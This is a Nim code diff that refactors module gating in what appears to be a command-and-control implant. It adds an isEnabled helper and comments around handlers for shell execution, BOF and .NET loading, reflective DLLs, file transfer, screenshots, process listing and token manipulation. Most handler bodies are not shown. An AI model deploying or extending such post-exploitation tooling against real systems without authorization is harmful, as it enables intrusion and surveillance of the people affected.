@@ -16,6 +16,10 @@ for cmd in low(CommandType) .. high(CommandType):
         let command = cast[CommandType](task.command)
         return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(protect("Command \"") & $command & protect("\" not enabled.")))
 
+# Helper function for checking if a module is enabled
+proc isEnabled(module: ModuleType): bool = 
+    return ((MODULES and cast[uint32](module)) == cast[uint32](module))
+
 #[
     Built-in modules (always enabled)
     - Agent configuration
@@ -168,7 +172,10 @@ commands[CMD_CANCEL] = proc(ctx: AgentCtx, task: Task): TaskResult =
     - filesystem operations
 ]#
 
-when ((MODULES and cast[uint32](MODULE_SHELL)) == cast[uint32](MODULE_SHELL)):
+#[
+    Shell command execution
+]#
+when MODULE_SHELL.isEnabled():
     import osproc
 
     commands[CMD_SHELL] = proc(ctx: AgentCtx, task: Task): TaskResult = 
@@ -192,7 +199,10 @@ when ((MODULES and cast[uint32](MODULE_SHELL)) == cast[uint32](MODULE_SHELL)):
         except CatchableError as err: 
             return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
-when ((MODULES and cast[uint32](MODULE_BOF)) == cast[uint32](MODULE_BOF)):
+#[
+    COFF/BOF execution
+]#
+when MODULE_BOF.isEnabled():
     import ../utils/coff 
 
     commands[CMD_BOF] = proc(ctx: AgentCtx, task: Task): TaskResult = 
@@ -218,7 +228,10 @@ when ((MODULES and cast[uint32](MODULE_BOF)) == cast[uint32](MODULE_BOF)):
         except CatchableError as err: 
             return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
-when ((MODULES and cast[uint32](MODULE_DOTNET)) == cast[uint32](MODULE_DOTNET)):
+#[
+    Dotnet assembly execution
+]#
+when MODULE_DOTNET.isEnabled():
     import ../utils/clr 
 
     commands[CMD_DOTNET] = proc(ctx: AgentCtx, task: Task): TaskResult = 
@@ -260,7 +273,10 @@ when ((MODULES and cast[uint32](MODULE_DOTNET)) == cast[uint32](MODULE_DOTNET)):
         except CatchableError as err: 
             return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
-when ((MODULES and cast[uint32](MODULE_DLL)) == cast[uint32](MODULE_DLL)):
+#[
+    DLL execution
+]#
+when MODULE_DLL.isEnabled():
     import ../utils/rdll
     
     proc dllJob(ctx: AgentCtx, hWrite, hStopEvent: HANDLE, task: Task) {.nimcall, gcsafe.} =
@@ -284,7 +300,10 @@ when ((MODULES and cast[uint32](MODULE_DLL)) == cast[uint32](MODULE_DLL)):
         except CatchableError as err:
             return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
-when ((MODULES and cast[uint32](MODULE_FILETRANSFER)) == cast[uint32](MODULE_FILETRANSFER)):
+#[
+    File upload & download
+]#
+when MODULE_FILETRANSFER.isEnabled():
     import os
 
     const DOWNLOAD_CHUNK_SIZE* = 512 * 1024
@@ -352,7 +371,10 @@ when ((MODULES and cast[uint32](MODULE_FILETRANSFER)) == cast[uint32](MODULE_FIL
         except CatchableError as err: 
             return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
-when ((MODULES and cast[uint32](MODULE_SCREENSHOT)) == cast[uint32](MODULE_SCREENSHOT)):
+#[ 
+    Screenshot
+]#
+when MODULE_SCREENSHOT.isEnabled():
     import times
     import ../utils/screenshot 
 
@@ -376,7 +398,10 @@ when ((MODULES and cast[uint32](MODULE_SCREENSHOT)) == cast[uint32](MODULE_SCREE
         except CatchableError as err: 
             return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
-when ((MODULES and cast[uint32](MODULE_PROCESS)) == cast[uint32](MODULE_PROCESS)):
+#[ 
+    Process enumeration
+]#
+when MODULE_PROCESS.isEnabled():
     import ../utils/process
 
     commands[CMD_PS] = proc(ctx: AgentCtx, task: Task): TaskResult = 
@@ -401,7 +426,10 @@ when ((MODULES and cast[uint32](MODULE_PROCESS)) == cast[uint32](MODULE_PROCESS)
         except CatchableError as err: 
             return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
-when ((MODULES and cast[uint32](MODULE_TOKEN)) == cast[uint32](MODULE_TOKEN)):
+#[
+    Token manipulation 
+]#
+when MODULE_TOKEN.isEnabled():
     import ../utils/token
 
     commands[CMD_MAKE_TOKEN] = proc(ctx: AgentCtx, task: Task): TaskResult =  
@@ -553,7 +581,10 @@ when ((MODULES and cast[uint32](MODULE_TOKEN)) == cast[uint32](MODULE_TOKEN)):
         except CatchableError as err: 
             return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
-when ((MODULES and cast[uint32](MODULE_FILESYSTEM)) == cast[uint32](MODULE_FILESYSTEM)):
+#[
+    Filesystem operations
+]#
+when MODULE_FILESYSTEM.isEnabled():
     import algorithm
 
     commands[CMD_PWD] = proc(ctx: AgentCtx, task: Task): TaskResult = 
